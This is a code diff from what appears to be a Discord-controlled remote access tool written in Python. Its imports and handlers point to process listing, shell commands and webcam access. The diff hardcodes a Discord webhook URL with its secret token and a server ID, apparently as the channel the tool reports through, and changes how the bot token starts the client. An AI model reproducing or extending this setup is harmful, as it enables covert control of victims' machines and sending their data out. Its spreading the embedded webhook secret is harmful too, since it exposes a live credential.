@@ -5,6 +5,7 @@ import asyncio
 import ctypes 
 import os
 import subprocess as sp
+from h11 import SERVER
 import requests 
 import cv2
 from queue import Queue
@@ -46,10 +47,10 @@ from discord_slash import SlashContext, SlashCommand
 from discord_slash.model import ButtonStyle
 from discord_slash.utils.manage_components import create_button, create_actionrow
 
-global token, webhook, g
-token = ""
-webhook = ""
-g = [420]
+
+
+webhook = "https://discord.com/api/webhooks/983705982343467069/Ve8Lc7ZhrTO0-ffInHib-bH5Pn8ORTDlmXHHPiHo4dWPxJjE80snVjoPSTsq_kCIRVln"
+g = [983370808976089091]
 
 
 ## Auto Commands | leave here for now
@@ -1738,10 +1739,7 @@ async def listProccess_command(ctx: SlashContext):
 
 #endregion
 
-def tokns(str1, str2, str3):
-    token = str1
-    webhook = str2
-    server_id = str3
-    g = [int(server_id)]
-    
-client.run(token)
+
+def token_set(str):
+    token = str
+    client.run(token)
